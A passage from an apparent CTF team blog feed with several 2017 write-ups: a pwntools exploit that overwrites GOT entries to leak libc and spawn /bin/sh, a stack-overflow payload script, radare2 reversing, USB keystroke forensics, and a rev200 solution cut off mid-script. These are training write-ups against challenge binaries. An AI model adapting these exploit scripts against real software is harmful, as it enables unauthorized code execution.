r.recvuntil('Please input 2nd addr') send(str(address2)) print r.recvuntil('Your choice: \\n') send('2') We can start by thinking into changing memcpy_got and read_got addresses, and why? because with this when we choose the option 2 to swap we will have something like this: 123read(&amp;dest, address1, 8uLL);read(address1, address2, 8uLL);read(address2, &amp;dest, 8uLL); The second read is what is interesting to us, we can controll the first two arguments to our advantage, if we choose the 1st address to be the file descriptor 0(STDIN) and the 2nd address the function we want to overwrite. 1read(0, ATOI_GOT, 0x8); // example: 1st arg: 0, 2nd arg: ATOI_GOT The next thing to do is to overwrite atoi function and why we want to do it? Because if we overwrite atoi into puts_plt we can leak addresses easily, because we first read them and then print them! 12read(0, &amp;buf, 0x10uLL);result = puts(&amp;buf); Now that we overwrite atoi with puts we can start trying to leak libc addresses like this: 1234print r.recvuntil('choice: \\n')r.send(\"B\")h = u64(r.recv(6).ljust(8, '\\x00')) # ljust will convert an address like 0x7f3253354340 into 0x0007f3253354340print \"STACK ADDRESS 0x%x\"%h Now we got a stack address but it’s still not the address we need, we have to calculate the offset of this address to the libcbase address! we can calculate this with help of gdb. Just run your python script (there will be a sleep of 5 seconds and attach the PID address on gdb like this: 123456789101112131415pwndbg&gt; attach 6865...outputfrompwngdb...pwndbg&gt; continuepwndbg&gt; p system$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fcb77dea391 &lt;system&gt;---------------runing-program-in-another-terminal---------------$ python swap.py..hidden-output...1. Set addrsses2. Swap both addrress of value0. ExitYour choice: STACK ADDRESS 0x7fcb7816a642 Now if we subtract the leaked address from the system address we got from gdb we will get and offset to system function: 12$ python -c \"print hex(0x7fcb7816a642 - 0x7fcb77dea391)\"0x3802b1 Adapting the python script: 123456789h = u64(r.recv(6).ljust(8, '\\x00'))print \"STACK ADDRESS 0x%x\"%haddr = h-0x3802b1- libc.symbols['system']LIBCBASE = addrSYSTEM = LIBCBASE + libc.symbols['system']#print r.recv(1024)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM) We still have a small problem from now on, now that we overwrite the atoi we can’t really choose which option from the menu, well we actually can! puts returns the number of bytes printed! the null byte is included in this count! 12int i = puts(&apos;\\x00&apos;) // returns 1int i = puts(&apos;B\\x00&apos;) // returns 2 Now we give the input ‘B\\x00’ into puts so it will return the value 2! and we overwrite the atoi-&gt;puts-&gt;system and sent the “/bin/sh\\x00” string to get ourselves a shell!: 1234567r.send('a\\x00') # returns option 2 from putsprint r.recvuntil('choice: \\n')r.send(p64(SYSTEM)) # overwrites atoi -&gt; puts -&gt; systemprint r.recvuntil('choice: \\n')r.send('/bin/sh\\x00') # passes argument /bin/sh into system The full script is: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *from pwnlib.tubes import *from pwnlib.util.packing import *from pwnlib.tubes.process import *from pwnlib.tubes.remote import *import structimport timedef getConn(local): return process('./swap', env = &#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)def send(s): print s r.sendline(s)def swap(address1, address2): print r.recvuntil('Your choice: \\n') send('1') print r.recvuntil('Please input 1st addr') send(str(address1)) print r.recvuntil('Please input 2nd addr') send(str(address2)) print r.recvuntil('Your choice: \\n') send('2')local = Falsebinary = ELF ( './swap' )libc = ELF('./libc.so.6')PUTSPLT = binary.plt['puts']ATOIGOT = binary.got['atoi']PUTSGOT = binary.got['puts']READGOT = binary.got['read']MEMCOPYGOT = binary.got['memcpy']r = getConn(local)swap(MEMCOPYGOT,READGOT)swap(0,ATOIGOT)r.send(p64(PUTSPLT))print r.recvuntil('choice: \\n')r.send(\"B\")h = u64(r.recv(6).ljust(8, '\\x00'))print \"STACK ADDRESS 0x%x\"%haddr = h-0x3802b1- libc.symbols['system']LIBCBASE = addrSYSTEM = LIBCBASE + libc.symbols['system']#print r.recv(1024)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM)r.send('a\\x00')print r.recvuntil('choice: \\n')r.send(p64(SYSTEM))print r.recvuntil('choice: \\n')r.send('/bin/sh\\x00')r.interactive()r.close() Running it 1234567891011121314151617181920$ python swap.py[*] '~/swap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)[*] '~/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled...hidden-output...STACK ADDRESS 0x7fe5d8827642[*] LIBC 0x7fe5d8462001[*] SYSTEM 0x7fe5d84a7391...hidden-output...$ cat flagTWCTF&#123;SWAP_SAWP_WASP_PWAS_SWPA&#125; I didn’t solve this challenge in the CTF tournament I actually read this write ups(https://ctftime.org/writeup/7387 and https://github.com/sk4px/CTFs/blob/master/tw2017/swap.py) and did the challenge by myself after that.","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"swapaddresses","slug":"swapaddresses","permalink":"https://teamrocketist.github.io/tags/swapaddresses/"}]},{"title":"[Reverse] Tokyo Westerns CTF 3rd 2017 - Rev Rev Rev","slug":"Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev","date":"2017-09-04T01:25:49.000Z","updated":"2018-10-24T23:21:04.842Z","comments":true,"path":"2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/","link":"","permalink":"https://teamrocketist.github.io/2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/","excerpt":"","text":"Rev Rev RevProblemrev_rev_rev Lets first disassemble the main function of the binary: Ignoring the MK_FP function which is related to the stack canaries protection on the executable we can see the program is reading from the STDIN into s and then modifies 4 modifications on the string using 4 functions: sub_80486B9(&amp;s);sub_80486DB(&amp;s);sub_8048738(&amp;s);sub_80487B2(&amp;s); Sub_80486B9 is just removing the new line in the end of the string by inserting a nullbyte on it (note that 10 or 0x0A in hex represents the \\n): 12345678char *__cdecl sub_80486B9(char *s)&#123; char *result; // eax@1 result = strchr(s, 10); *result = 0; return result;&#125; sub_80486DB is just reversing the string: 1234567891011121314151617181920char *__cdecl sub_80486DB(char *s)&#123; char v1; // ST17_1@2 char *result; // eax@3 char *v3; // [sp+8h] [bp-10h]@1 char *i; // [sp+Ch] [bp-Ch]@1 v3 = s; for ( i = &amp;s[strlen(s) - 1]; ; --i ) &#123; result = v3; if ( v3 &gt;= i ) break; v1 = *v3; *v3 = *i; *i = v1; ++v3; &#125; return result;&#125; sub_8048738 is performing a bunch of operation on the characters of the string some AND, OR and shifts 123456789101112131415161718int __cdecl sub_8048738(char *a1)&#123; char v1; // ST0B_1@2 unsigned __int8 v2; // ST0B_1@2 int result; // eax@3 char *i; // [sp+Ch] [bp-4h]@1 for ( i = a1; ; ++i ) &#123; result = (unsigned __int8)*i; if ( !(_BYTE)result ) break; v1 = 2 * (*i &amp; 0x55) | (*i &gt;&gt; 1) &amp; 0x55; v2 = 4 * (v1 &amp; 0x33) | (v1 &gt;&gt; 2) &amp; 0x33; *i = 16 * v2 | (v2 &gt;&gt; 4); &#125; return result;&#125; sub_80487B2 is flipping the bits of each byte using ~ operator 1234567891011121314int __cdecl sub_80487B2(_BYTE *a1)&#123; int result; // eax@3 _BYTE *i; // [sp+Ch] [bp-4h]@1 for ( i = a1; ; ++i ) &#123; result = *i; if ( !(_BYTE)result ) break; *i = ~*i; &#125; return result;&#125; We could rewrite this functions in python and apply it into the cipher string to get the real flag back! but thats too much work why don’t we insert the ciphertext to the binary and check if it spits the flag? lets do this with radare2: And we got the flag!!! Additionally I did a python script that interacts with radare2 using r2pipe which is a really cool python package, this script will automate what I did manually above doing a dynamic analysis: 12345678910111213141516171819202122232425import r2pipeimport structprofile = \"\"\"#!/usr/bin/rarun2program=./rev_rev_revstdin=output\"\"\"with open('profile.r2','w+') as f: print &gt;&gt;f, profilebuf = struct.pack (\"31B\", *[0x41,0x29,0xd9,0x65,0xa1,0xf1,0xe1,0xc9,0x19,0x09,0x93,0x13,0xa1,0x09,0xb9,0x49,0xb9,0x89,0xdd,0x61,0x31,0x69,0xa1,0xf1,0x71,0x21,0x9d,0xd5,0x3d,0x15,0xd5])with open('output','w+') as f: print &gt;&gt;f, bufr2=r2pipe.open('./rev_rev_rev')r2.cmd(\"e dbg.profile=profile.r2\")r2.cmd(\"doo\")r2.cmd(\"db 0x804866D\")r2.cmd(\"dc\")ciphertext = r2.cmd(\"pcp 31@ 0x8048870\")print r2.cmd(\"psz @ (ebp-0x2d)\") Running it 12$ python revrevrev.py 2&gt;/dev/null TWCTF&#123;qpzisyDnbmboz76oglxpzYdk&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"ida","slug":"ida","permalink":"https://teamrocketist.github.io/tags/ida/"},{"name":"radare2","slug":"radare2","permalink":"https://teamrocketist.github.io/tags/radare2/"}]},{"title":"[Pwn] Tokyo Westerns CTF 3rd 2017 - Just do it!","slug":"Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it","date":"2017-09-04T00:29:07.000Z","updated":"2018-11-06T04:31:44.277Z","comments":true,"path":"2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/","link":"","permalink":"https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/","excerpt":"","text":"Just do it!ProblemDo it! Do it!nc pwn1.chal.ctf.westerns.tokyo 12345(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)just_do_it Starting by De-assembler with ida and use its ability to some c pseudo code: 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [sp+8h] [bp-20h]@7 FILE *stream; // [sp+18h] [bp-10h]@1 char *v6; // [sp+1Ch] [bp-Ch]@1 setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 2, 0); v6 = failed_message; stream = fopen(\"flag.txt\", \"r\"); if ( !stream ) &#123; perror(\"file open error.\\n\"); exit(0); &#125; if ( !fgets(flag, 48, stream) ) &#123; perror(\"file read error.\\n\"); exit(0); &#125; puts(\"Welcome my secret service. Do you know the password?\"); puts(\"Input the password.\"); if ( !fgets(&amp;s, 32, stdin) ) &#123; perror(\"input error.\\n\"); exit(0); &#125; if ( !strcmp(&amp;s, PASSWORD) ) v6 = success_message; puts(v6); return 0;&#125; We can see clearly there is a buffer overflow problem on strcmp PASSWORD comes from STDIN, if we give a password greater than the variable s can handle, we will overflow in this one we don’t even need to modify the ret address. We can just modify the address from v6 to the flag variable address! which is stored from a file “flag.txt” in the server. First lets just discover the offset we could know this by looking at the assembly code and check how space was saved in the stack for this variable by looking the offset from ebp or we can just use gdb with some help from metasploit to generate patterns: 12345678910$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab$ gdb ./justdoitpwndbg&gt; rStarting program: /home/evilgod/Documents/Hacking/ctf/tokyo/pwn/justdoit/just Welcome my secret service. Do you know the password?Input the password.Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5AbProgram received signal SIGSEGV (fault address 0x37614136) We can see it broke at address 0x37614136 we again can calculate it in metasploit with pattern_offset 12$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37614136[*] Exact match at offset 20 Now we can see we need to add more than 20 characters to overflow! now lets use IDA to get the address where is stored our flag: And finally writing a script: 123FLAG = 0x0804A080payload = 'A' *20 + struct.pack('&lt;L',FLAG)print payload getting the flag….1234$ python justdoit.py | nc pwn1.chal.ctf.westerns.tokyo 12482Welcome my secret service. Do you know the password?Input the password.TWCTF&#123;pwnable_warmup_I_did_it!&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Stack Issue","slug":"Pwn/x86/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x86/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"tokyoWesterns2017","slug":"tokyoWesterns2017","permalink":"https://teamrocketist.github.io/tags/tokyoWesterns2017/"}]},{"title":"[Forensics] Hackit 2017 - USB ducker","slug":"Forensics-Hackit-2017-USB-ducker","date":"2017-08-29T16:25:11.000Z","updated":"2018-10-24T23:21:04.834Z","comments":true,"path":"2017/08/29/Forensics-Hackit-2017-USB-ducker/","link":"","permalink":"https://teamrocketist.github.io/2017/08/29/Forensics-Hackit-2017-USB-ducker/","excerpt":"","text":"USB duckerforen100Description: This file was captured from one of the computers at the Internet cafe. We think that the hacker was using this computer at that time. Try to get his secret documents. ( flag format is flag{…} )Attachment: (none)Webpage: https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3MHint: (none) Another USB pcap, after analysing it with wireshark we can see that we have two devices one is a keyboard(bInterfaceClass: HID: 0x3) and the other is a mouse(Unknown)… Mouse Keyboard We can clearly see we that HID: 0x3 is a keyboard by searching for strings in wireshark EDIT -&gt; Find Packet I actually tried to see what the hacker did with the mouse but didn’t found anything special just a straight line of clicks you could parse the mouse inputs with tshark like this for example:1tshark -r task.pcap -Y \"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass!=3\" -Tfields -e usb.capdata &gt; mouse Moving on to the keyboard since the mouse didn’t got us anything special we just got the output from the keyboard1tshark -r task.pcap -Y \"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass==3\" -Tfields -e usb.capdata &gt; keyboard Now the tricky part here is, the hacker used the arrow keys! making it harder to make a script to spit out the keyboard inputs, well during the CTF I got frustrated, and choose to make it by hand by looking at the table on http://www.usb.org/developers/hidpage/Hut1_12v2.pdf (table 12). The keyboard inputs can be read like this: 12345 |-&gt; The value of the keypressed you can &quot;decode&quot; this value from the table 12 above |02:00:20:00:00:00:00:00| |--&gt; This value is 02 when shift is pressed and 00 when it isn&apos;t When the CTF finished I ended up doing a script to do this (it’s not perfect there is alot of more things to consider). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#!/usr/bin/python # -*- coding: utf-8 -*-KEY_CODES = &#123; 0x04:['a', 'A'], 0x05:['b', 'B'], 0x06:['c', 'C'], 0x07:['d', 'D'], 0x08:['e', 'E'], 0x09:['f', 'F'], 0x0A:['g', 'G'], 0x0B:['h', 'H'], 0x0C:['i', 'I'], 0x0D:['j', 'J'], 0x0E:['k', 'K'], 0x0F:['l', 'L'], 0x10:['m', 'M'], 0x11:['n', 'N'], 0x12:['o', 'O'], 0x13:['p', 'P'], 0x14:['q', 'Q'], 0x15:['r', 'R'], 0x16:['s', 'S'], 0x17:['t', 'T'], 0x18:['u', 'U'], 0x19:['v', 'V'], 0x1A:['w', 'W'], 0x1B:['x', 'X'], 0x1C:['y', 'Y'], 0x1D:['z', 'Z'], 0x1E:['1', '!'], 0x1F:['2', '@'], 0x20:['3', '#'], 0x21:['4', '$'], 0x22:['5', '%'], 0x23:['6', '^'], 0x24:['7', '&amp;'], 0x25:['8', '*'], 0x26:['9', '('], 0x27:['0', ')'], 0x28:['\\n','\\n'], 0x2C:[' ', ' '], 0x2D:['-', '_'], 0x2E:['=', '+'], 0x2F:['[', '&#123;'], 0x30:[']', '&#125;'], 0x32:['#','~'], 0x33:[';', ':'], 0x34:['\\'', '\"'], 0x36:[',', '&lt;'], 0x38:['/', '?'], 0x37:['.', '&gt;'], 0x2b:['\\t','\\t'], 0x4f:[u'→',u'→'], 0x50:[u'←',u'←'], 0x51:[u'↓',u'↓'], 0x52:[u'↑',u'↑']&#125; #tshark -r ./usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata &gt; keyboards.txtdatas = open('keyboard').read().split('\\n')[:-1]cursor_x = 0cursor_y = 0offset_current_line = 0lines = ['','','','','']output = ''for data in datas: shift = int(data.split(':')[0], 16) / 2 key = int(data.split(':')[2], 16) if key == 0: continue if KEY_CODES[key][shift] == u'↑': lines[cursor_y] += output output = '' cursor_y -= 1 elif KEY_CODES[key][shift] == u'↓': lines[cursor_y] += output output = '' cursor_y += 1 elif KEY_CODES[key][shift] == u'→': cursor_x += 1 elif KEY_CODES[key][shift] == u'←': cursor_x -= 1 elif KEY_CODES[key][shift] == '\\n': lines[cursor_y] += output cursor_x = 0 cursor_y += 1 output = '' else: output += KEY_CODES[key][shift] cursor_x += 1print '\\n'.join(lines) Now running the script 123456teamrocketist@Debian ~/D/H/c/h/f/for100&gt; python key2.pyw&#123;w$ju&#125;,'pt]=j%;9+ps&amp;#,k#&gt;bn$:6pjim0&#123;u'h;fks!s-flag&#123;k3yb0ard_sn4ke_2.0&#125;b[[e[fu~7d[=&gt;*(0]'$1c$ce3'ci.[%=%&amp;k(lc*2y4!&#125;%qz3 The flag is flag{k3yb0ard_sn4ke_2.0}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"pcap","slug":"pcap","permalink":"https://teamrocketist.github.io/tags/pcap/"},{"name":"wireshark","slug":"wireshark","permalink":"https://teamrocketist.github.io/tags/wireshark/"},{"name":"tshark","slug":"tshark","permalink":"https://teamrocketist.github.io/tags/tshark/"},{"name":"keyboard","slug":"keyboard","permalink":"https://teamrocketist.github.io/tags/keyboard/"},{"name":"mouse","slug":"mouse","permalink":"https://teamrocketist.github.io/tags/mouse/"},{"name":"usb","slug":"usb","permalink":"https://teamrocketist.github.io/tags/usb/"}]},{"title":"[Reverse] Hackit 2017 - rev200","slug":"Reverse-Hackit-2017-rev200","date":"2017-08-27T22:21:35.000Z","updated":"2018-10-24T23:21:04.834Z","comments":true,"path":"2017/08/27/Reverse-Hackit-2017-rev200/","link":"","permalink":"https://teamrocketist.github.io/2017/08/27/Reverse-Hackit-2017-rev200/","excerpt":"","text":"rev200Description: You haxor, come on you little sciddie… debug me, eh? You fucking little lamer… You fuckin’ come on, come debug me! I’ll get your ass, you jerk! Oh, you IDA monkey! Fuck all you and your tools! Come on, you scum haxor, you try to reverse me? Come on, you asshole!!Attachment: (none)Webpage: https://mega.nz/#!RQJk0ZbR!7myppeUU6fwqRY2cOaX8EPTpC9pVIHEsWdUNw0szexcHint: (none) When I looked up into this challenge I just checked the assembly code and found it way too easy for 200 points, but then I saw something weird I couldn’t start it for debugging and then I checked the file types: 12$ file rev200\\ \\(1\\).efi rev200 (1).efi: PE32+ executable (DLL) (EFI application) x86-64 (stripped to external PDB), for MS Windows Oh its a ddl, that’s why well I still found it way to easy for all this points specially because with IDA we can convert this beautiful assembly code(missing the code for algo function): Into this beautiful “pseudo c” code(press F5 in IDA), well it makes everything much easier even thought the assembly wasn’t that hard to reverse…. Here we have the pseudo c code for “main” function and “algo” function… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667__int64 __fastcall efi_main(__int64 a1, __int64 a2)&#123; UINTN v2; // rbx@3 char v4[48]; // [sp+20h] [bp-A0h]@1 __int16 v5; // [sp+48h] [bp-78h]@1 CHAR16 String[48]; // [sp+50h] [bp-70h]@1 int v7; // [sp+A0h] [bp-20h]@1 char v8; // [sp+B0h] [bp-10h]@4 int v9; // [sp+B8h] [bp-8h]@1 int i; // [sp+BCh] [bp-4h]@1 __int64 v11; // [sp+E8h] [bp+28h]@1 v11 = a2; InitializeLib(); memset(String, 0, 0x50ui64); v7 = 0; memset(v4, 0, 0x28ui64); v5 = 0; v9 = 0; Input(L\"Enter the flag: \", String, 42i64); for ( i = 0; ; ++i ) &#123; v2 = i; if ( v2 &gt;= StrLen(String) ) break; v4[i] = String[i]; &#125; algo((__int64)v4); (**(void (__fastcall ***)(_QWORD, _QWORD))(v11 + 48))(*(_QWORD *)(v11 + 48), 0i64); (*(void (__fastcall **)(signed __int64, signed __int64, char *))(*(_QWORD *)(v11 + 96) + 96i64))( 1i64, *(_QWORD *)(v11 + 48) + 16i64, &amp;v8); return 0i64;&#125;UINTN __fastcall algo(__int64 a1)&#123; UINTN result; // rax@17 int v2[40]; // [sp+20h] [bp-60h]@11 int v3[20]; // [sp+C0h] [bp+40h]@5 int v4[23]; // [sp+110h] [bp+90h]@2 int m; // [sp+16Ch] [bp+ECh]@13 int l; // [sp+170h] [bp+F0h]@10 int k; // [sp+174h] [bp+F4h]@7 int j; // [sp+178h] [bp+F8h]@4 int i; // [sp+17Ch] [bp+FCh]@1 for ( i = 0; i &lt;= 19; ++i ) v4[i] = *(_BYTE *)(i + a1); for ( j = 20; j &lt;= 39; ++j ) v3[j - 20] = *(_BYTE *)(j + a1); for ( k = 0; k &lt;= 19; ++k ) &#123; v4[k] = (((((v4[k] ^ 0xC) + 6) ^ 0xD) + 7) ^ 0xE) + 8; v3[k] = (((((v3[k] ^ 0xF) + 9) ^ 0x10) + 10) ^ 0x11) + 11; &#125; for ( l = 0; l &lt;= 19; ++l ) v2[l] = v4[l]; for ( m = 20; m &lt;= 39; ++m ) v2[m] = v3[m - 20]; if ( (unsigned int)memcmp((__int64)v2, (__int64)&amp;correct, 160) ) result = Print(L\"\\nWrong\\n\"); else result = Print(L\"\\nCorrect\\n\"); return result;&#125; By reading this c code above we can clearly understand what is going on. the program itself reads from the stdout the flag and then encrypts a bunch of bytes with some xor operations and other stupid simple manipulations, since we know the ciphertext (we can get it from IDA) just double click on “correct” symbol from the main function and you will see its value in the global variables: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161.data:0000000070946000 public correct.data:0000000070946000 correct db 68h ; h ; DATA XREF: algo+18E\u0018o.data:0000000070946001 db 0.data:0000000070946002 db 0.data:0000000070946003 db 0.data:0000000070946004 db 3Ch ; &lt;.data:0000000070946005 db 0.data:0000000070946006 db 0.data:0000000070946007 db 0.data:0000000070946008 db 79h ; y.data:0000000070946009 db 0.data:000000007094600A db 0.data:000000007094600B db 0.data:000000007094600C db 71h ; q.data:000000007094600D db 0.data:000000007094600E db 0.data:000000007094600F db 0.data:0000000070946010 db 63h ; c.data:0000000070946011 db 0.data:0000000070946012 db 0.data:0000000070946013 db 0.data:0000000070946014 db 7Ch ; |.data:0000000070946015 db 0.data:0000000070946016 db 0.data:0000000070946017 db 0.data:0000000070946018 db 81h ; ü.data:0000000070946019 db 0.data:000000007094601A db 0.data:000000007094601B db 0.data:000000007094601C db 92h ; Æ.data:000000007094601D db 0.data:000000007094601E db 0.data:000000007094601F db 0.data:0000000070946020 db 92h ; Æ.data:0000000070946021 db 0.data:0000000070946022 db 0.data:0000000070946023 db 0.data:0000000070946024 db 65h ; e.data:0000000070946025 db 0.data:0000000070946026 db 0.data:0000000070946027 db 0.data:0000000070946028 db 65h ; e.data:0000000070946029 db 0.data:000000007094602A db 0.data:000000007094602B db 0.data:000000007094602C db 93h ; ô.data:000000007094602D db 0.data:000000007094602E db 0.data:000000007094602F db 0.data:0000000070946030 db 92h ; Æ.data:0000000070946031 db 0.data:0000000070946032 db 0.data:0000000070946033 db 0.data:0000000070946034 db 49h ; I.data:0000000070946035 db 0.data:0000000070946036 db 0.data:0000000070946037 db 0.data:0000000070946038 db 79h ; y.data:0000000070946039 db 0.data:000000007094603A db 0.data:000000007094603B db 0.data:000000007094603C db 92h ; Æ.data:000000007094603D db 0.data:000000007094603E db 0.data:000000007094603F db 0.data:0000000070946040 db 38h ; 8.data:0000000070946041 db 0.data:0000000070946042 db 0.data:0000000070946043 db 0.data:0000000070946044 db 6Ch ; l.data:0000000070946045 db 0.data:0000000070946046 db 0.data:0000000070946047 db 0.data:0000000070946048 db 3Ch ; &lt;.data:0000000070946049 db 0.data:000000007094604A db 0.data:000000007094604B db 0.data:000000007094604C db 6Fh ; o.data:000000007094604D db 0.data:000000007094604E db 0.data:000000007094604F db 0.data:0000000070946050 db 7Bh ; &#123;.data:0000000070946051 db 0.data:0000000070946052 db 0.data:0000000070946053 db 0.data:0000000070946054 db 87h ; ç.data:0000000070946055 db 0.data:0000000070946056 db 0.data:0000000070946057 db 0.data:0000000070946058 db 58h ; X.data:0000000070946059 db 0.data:000000007094605A db 0.data:000000007094605B db 0.data:000000007094605C db 55h ; U.data:000000007094605D db 0.data:000000007094605E db 0.data:000000007094605F db 0.data:0000000070946060 db 89h ; ë.data:0000000070946061 db 0.data:0000000070946062 db 0.data:0000000070946063 db 0.data:0000000070946064 db 5Ah ; Z.data:0000000070946065 db 0.data:0000000070946066 db 0.data:0000000070946067 db 0.data:0000000070946068 db 59h ; Y.data:0000000070946069 db 0.data:000000007094606A db 0.data:000000007094606B db 0.data:000000007094606C db 7Eh ; ~.data:000000007094606D db 0.data:000000007094606E db 0.data:000000007094606F db 0.data:0000000070946070 db 7Eh ; ~.data:0000000070946071 db 0.data:0000000070946072 db 0.data:0000000070946073 db 0.data:0000000070946074 db 6Bh ; k.data:0000000070946075 db 0.data:0000000070946076 db 0.data:0000000070946077 db 0.data:0000000070946078 db 87h ; ç.data:0000000070946079 db 0.data:000000007094607A db 0.data:000000007094607B db 0.data:000000007094607C db 6Ch ; l.data:000000007094607D db 0.data:000000007094607E db 0.data:000000007094607F db 0.data:0000000070946080 db 57h ; W.data:0000000070946081 db 0.data:0000000070946082 db 0.data:0000000070946083 db 0.data:0000000070946084 db 6Ch ; l.data:0000000070946085 db 0.data:0000000070946086 db 0.data:0000000070946087 db 0.data:0000000070946088 db 6Bh ; k.data:0000000070946089 db 0.data:000000007094608A db 0.data:000000007094608B db 0.data:000000007094608C db 58h ; X.data:000000007094608D db 0.data:000000007094608E db 0.data:000000007094608F db 0.data:0000000070946090 db 59h ; Y.data:0000000070946091 db 0.data:0000000070946092 db 0.data:0000000070946093 db 0.data:0000000070946094 db 5Ah ; Z.data:0000000070946095 db 0.data:0000000070946096 db 0.data:0000000070946097 db 0.data:0000000070946098 db 5Ah ; Z.data:0000000070946099 db 0.data:000000007094609A db 0.data:000000007094609B db 0.data:000000007094609C db 6Fh ; o.data:000000007094609D db 0.data:000000007094609E db 0.data:000000007094609F db 0 Now parsing it with sublime-txt(very fast and easy to do it), than we put into a hex byte characters string in python… why not put the characters since ida actually shows some of them? Because this is a ciphertext and some characters may be unprintable or those which can be printed may require unicode and we all know how boring is to deal with unicode in python … so I always use hex bytes. 1correct = \"\\x68\\x3C\\x79\\x71\\x63\\x7C\\x81\\x92\\x92\\x65\\x65\\x93\\x92\\x49\\x79\\x92\\x38\\x6C\\x3C\\x6F\\x7B\\x87\\x58\\x55\\x89\\x5A\\x59\\x7E\\x7E\\x6B\\x87\\x6C\\x57\\x6C\\x6B\\x58\\x59\\x5A\\x5A\\x6F\" Now I have an idea instead of trying to make a function that reverses those two functions why not bruteforce byte by byte, replicate the pseudo c code in python and when we get the final ciphertext equal to the “correct” variable we end the calculations and print the original string? seems like a cool plan! so we just rewrite that c code into python and then we add some loops to bruteforce the rest of the flag!!! We don’t even need to bruteforce from the range from 0x00 to the 0xff we can just use printable characters since the flag will only have those! and more we already have the beginning and the end of the flag which is “h4ck1t{“ and “}”. Here is the final payload:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from __future__ import print_functionimport difflibimport sysimport stringfrom difflib import Differcorrect = \"\\x68\\x3C\\x79\\x71\\x63\\x7C\\x81\\x92\\x92\\x65\\x65\\x93\\x92\\x49\\x79\\x92\\x38\\x6C\\x3C\\x6F\\x7B\\x87\\x58\\x55\\x89\\x5A\\x59\\x7E\\x7E\\x6B\\x87\\x6C\\x57\\x6C\\x6B\\x58\\x59\\x5A\\x5A\\x6F\"def algo(a1, offset): result = \"\" v2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] v3 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] v4 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] for i in xrange(20): v4[i] = ord(a1[i]) for j in xrange(20,40): v3[j-20]= ord(a1[j]) for k in xrange(0,20): v4[k] = (((((v4[k] ^ 0xC) + 6) ^ 0xD) + 7) ^ 0xE) + 8 v3[k] = (((((v3[k] ^ 0xF) + 9) ^ 0x10) + 10) ^ 0x11) + 11 for l in xrange(0,20): v2[l] = v4[l] for m in xrange(20,40): v2[m] = v3[m-20] flag = ''.join([chr(x) for x in 